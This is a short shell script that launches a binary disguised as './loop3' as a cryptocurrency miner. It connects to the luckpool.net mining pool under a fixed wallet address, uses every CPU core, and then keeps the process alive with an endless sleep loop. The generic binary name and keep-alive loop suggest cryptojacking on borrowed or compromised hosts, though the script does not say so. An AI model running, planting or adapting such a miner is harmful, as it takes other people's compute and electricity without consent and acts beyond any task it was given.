#!/bin/sh
timeout -k 30s 120s ./loop3 -v -l ap.luckpool.net:3956 -u RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4.$(shuf -n 1 -i 1-99999)-cpu -p x -t $(nproc)
while [ 1 ]; do
sleep 3
done
sleep 999
